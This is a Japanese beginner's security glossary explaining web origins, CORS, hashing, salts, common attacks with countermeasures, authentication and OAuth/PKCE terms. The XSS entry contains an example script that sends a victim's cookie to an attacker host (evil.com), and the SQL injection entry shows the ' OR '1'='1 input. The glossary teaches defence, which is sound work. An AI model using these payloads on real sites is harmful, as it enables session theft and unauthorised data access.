# セキュリティ用語集

## このドキュメントの目的

セキュリティ学習で登場する**基本用語**を理解しやすくまとめています。わからない用語があればここで確認してください。

---

## ネットワーク・Web基礎

### オリジン（Origin）

```
Webにおける「出所」を表す概念。
以下の3要素の組み合わせで定義される：

1. スキーム（プロトコル）: https
2. ホスト: example.com
3. ポート: 443

例:
https://example.com:443  ← これが1つのオリジン
https://example.com      ← ポート省略時はデフォルト（443）

同一オリジン（Same Origin）:
https://example.com/page1
https://example.com/page2
→ スキーム、ホスト、ポートが全て同じなので「同一オリジン」

異なるオリジン（Cross Origin）:
https://example.com
https://api.example.com  ← ホストが違う
http://example.com       ← スキームが違う
https://example.com:8080 ← ポートが違う
```

### 同一オリジンポリシー（Same-Origin Policy）

```
ブラウザのセキュリティ機能。
異なるオリジンのリソースへのアクセスを制限する。

例:
https://myapp.com のJavaScriptから
https://api.other.com のAPIを呼び出そうとすると
→ ブラウザがブロックする（CORSで許可しない限り）

目的:
悪意のあるサイトが、ユーザーがログイン中の別サイトの
データを盗むことを防ぐ
```

### CORS（Cross-Origin Resource Sharing）

```
異なるオリジン間でリソースを共有するための仕組み。

サーバーが「このオリジンからのアクセスは許可する」と
HTTPヘッダーで宣言することで、同一オリジンポリシーを
緩和できる。

例:
Access-Control-Allow-Origin: https://myapp.com
→ myapp.comからのアクセスを許可
```

---

## 暗号・セキュリティ基礎

### エントロピー（Entropy）

```
ランダム性・予測困難性の指標。ビット数で表す。

高エントロピー = 予測が困難 = セキュリティが高い
低エントロピー = 予測が容易 = セキュリティが低い

例:
- 4桁の数字PIN: 約13ビット（10,000通り）
- 128ビットのランダム値: 2^128通り（天文学的数字）

セッションIDやトークンには128ビット以上のエントロピーが推奨
```

### ハッシュ（Hash）

```
任意の長さのデータを固定長の値に変換する関数。

特徴:
1. 一方向性: ハッシュ値から元データを復元できない
2. 衝突耐性: 同じハッシュ値になる別データを見つけにくい
3. 雪崩効果: 入力が少し変わると出力が大きく変わる

用途:
- パスワード保存（平文を保存しない）
- データ改ざん検知
- 電子署名

例:
"password" → SHA-256 → "5e884898da28..."
"Password" → SHA-256 → "8b9b2e2e..." （全く異なる値）
```

### ソルト（Salt）

```
パスワードハッシュ時に追加するランダムな値。

なぜ必要か:
同じパスワードでも、ソルトが違えば異なるハッシュ値になる
→ レインボーテーブル攻撃を防げる

例:
パスワード "password" + ソルト "abc123" → ハッシュA
パスワード "password" + ソルト "xyz789" → ハッシュB
→ 同じパスワードでも異なるハッシュ値
```

### 暗号論的擬似乱数生成器（CSPRNG）

```
Cryptographically Secure Pseudo-Random Number Generator

セキュリティ用途に適した乱数生成器。
通常の乱数（Math.random等）は予測可能な場合があり、
セキュリティ用途には不適切。

使用例:
- セッションID生成
- トークン生成
- 暗号鍵生成

Java: SecureRandom
JavaScript: crypto.getRandomValues()
Python: secrets モジュール
```

---

## 攻撃手法

### MITM（Man-in-the-Middle）攻撃

```
中間者攻撃。通信の途中に割り込んで盗聴・改ざんする攻撃。

攻撃シナリオ:
ユーザー ←→ [攻撃者] ←→ サーバー

攻撃者はユーザーとサーバーの間に入り、
通信内容を盗み見たり、改ざんしたりする。

対策:
- HTTPS（TLS）で通信を暗号化
- 証明書の検証
```

### XSS（Cross-Site Scripting）

```
クロスサイトスクリプティング。
悪意のあるスクリプトをWebページに注入する攻撃。

攻撃シナリオ:
1. 攻撃者が掲示板に悪意のあるスクリプトを投稿
   <script>document.location='https://evil.com?cookie='+document.cookie</script>
2. 他のユーザーがそのページを閲覧
3. スクリプトが実行され、Cookieが攻撃者に送信される

対策:
- 出力時のHTMLエスケープ
- Content Security Policy（CSP）
- HttpOnly Cookie
```

### CSRF（Cross-Site Request Forgery）

```
クロスサイトリクエストフォージェリ。
ユーザーの意図しないリクエストを送信させる攻撃。

攻撃シナリオ:
1. ユーザーが銀行サイトにログイン中
2. 攻撃者のサイトを訪問
3. 攻撃者のサイトが銀行への送金リクエストを自動送信
4. ユーザーのCookieが自動的に含まれ、送金が実行される

対策:
- CSRFトークン
- SameSite Cookie
- Refererヘッダーの検証
```

### SQLインジェクション

```
SQL文に悪意のあるコードを注入する攻撃。

脆弱なコード:
"SELECT * FROM users WHERE name = '" + userInput + "'"

攻撃入力:
' OR '1'='1

結果:
SELECT * FROM users WHERE name = '' OR '1'='1'
→ 全ユーザーが返される

対策:
- パラメータ化クエリ（Prepared Statement）
- ORMの使用
```

### ブルートフォース攻撃

```
総当たり攻撃。全ての組み合わせを試す攻撃。

例:
4桁のPIN（0000〜9999）を全て試す
→ 最大10,000回で突破

対策:
- 長く複雑なパスワード
- 試行回数制限
- アカウントロック
- CAPTCHA
```

### クレデンシャルスタッフィング

```
他のサービスから流出した認証情報を使い回す攻撃。

攻撃シナリオ:
1. サービスAから認証情報が流出（email + password）
2. 攻撃者が流出データを入手
3. サービスB、C、Dに同じ認証情報でログイン試行
4. パスワードを使い回しているユーザーのアカウントに侵入

対策:
- パスワードの使い回しをしない（ユーザー教育）
- 流出パスワードのチェック（Have I Been Pwned等）
- 多要素認証
```

---

## 認証・認可

### 認証（Authentication）

```
「あなたは誰か」を確認するプロセス。

方法:
- 知識要素: パスワード、PIN
- 所持要素: スマートフォン、セキュリティキー
- 生体要素: 指紋、顔認証

結果:
「このユーザーはAliceである」と確認される
```

### 認可（Authorization）

```
「あなたは何ができるか」を決定するプロセス。

認証後に行われる。

例:
- Aliceは自分のプロファイルを編集できる
- Aliceは他人のプロファイルを編集できない
- 管理者は全てのプロファイルを編集できる
```

### MFA（Multi-Factor Authentication）

```
多要素認証。複数の認証要素を組み合わせる。

例:
1. パスワード入力（知識要素）
2. スマートフォンに送られたコードを入力（所持要素）

1つの要素が漏洩しても、他の要素で保護される
```

### セッション

```
ユーザーとサーバー間の継続的な状態。

HTTPはステートレス（状態を持たない）なので、
セッション機構でログイン状態などを維持する。

仕組み:
1. ログイン成功時にセッションIDを発行
2. セッションIDをCookieに保存
3. 以降のリクエストでセッションIDを送信
4. サーバーがセッションIDでユーザーを識別
```

---

## OAuth/OIDC関連

### アクセストークン（Access Token）

```
APIにアクセスするための認可情報。

例:
Authorization: Bearer eyJhbGciOiJSUzI1NiI...

特徴:
- 短い有効期限（通常1時間）
- 漏洩しても被害を限定できる
```

### リフレッシュトークン（Refresh Token）

```
新しいアクセストークンを取得するためのトークン。

特徴:
- 長い有効期限（30日など）
- 機密性が非常に高い
- HttpOnly Cookieで保存することを推奨
```

### PKCE（Proof Key for Code Exchange）

```
ピクシーと読む。Authorization Code横取り攻撃を防ぐ仕組み。

仕組み:
1. クライアントがランダムな値（code_verifier）を生成
2. code_verifierのハッシュ（code_challenge）を認可リクエストに含める
3. トークンリクエスト時にcode_verifierを送信
4. サーバーがハッシュを照合

効果:
Authorization Codeを横取りしても、
code_verifierがないとトークンを取得できない
```

---

## 参考資料

- [OWASP Glossary](https://owasp.org/www-community/Glossary)
- [MDN Web Docs - セキュリティ](https://developer.mozilla.org/ja/docs/Web/Security)

---

**最終更新**: 2025-12-25
**対象**: セキュリティ学習の初学者
